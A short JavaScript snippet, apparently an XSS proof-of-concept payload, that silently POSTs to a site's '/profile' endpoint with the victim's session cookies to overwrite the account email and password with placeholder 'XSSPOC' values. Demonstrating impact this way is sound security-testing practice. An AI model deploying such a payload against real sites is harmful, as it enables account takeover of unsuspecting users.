fetch("/profile", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: new URLSearchParams({
    email: "XSSPOC@test.com",
    password: "XSSPOC",
  }),
  credentials: "same-origin",
});
